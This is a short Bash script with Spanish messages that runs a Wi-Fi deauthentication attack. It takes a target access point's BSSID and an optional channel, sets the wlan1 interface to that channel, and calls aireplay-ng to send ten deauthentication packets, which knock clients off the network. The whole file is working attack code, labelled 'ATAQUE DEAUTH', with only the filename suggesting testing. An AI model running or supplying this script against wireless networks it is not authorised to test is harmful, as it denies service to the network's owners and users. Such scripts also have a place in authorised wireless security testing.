#!/bin/bash

INTERFACE="wlan1"

if [ -z "$1" ]; then
    echo "Uso: ./deauth_test.sh <BSSID_OBJETIVO> [CANAL]"
    echo "Ejemplo: ./deauth_test.sh AA:BB:CC:DD:EE:FF 6"
    exit 1
fi

TARGET_BSSID=$1
CHANNEL=$2

# Si se especifica canal, cambiarlo primero
if [ -n "$CHANNEL" ]; then
    echo "Cambiando al canal $CHANNEL..."
    sudo iwconfig $INTERFACE channel $CHANNEL
fi

echo "--- INICIANDO ATAQUE DEAUTH ---"
echo "Objetivo: $TARGET_BSSID"
echo "Enviando 10 paquetes de desconexión..."

sudo aireplay-ng -0 10 -a $TARGET_BSSID $INTERFACE

echo "--- ATAQUE FINALIZADO ---"
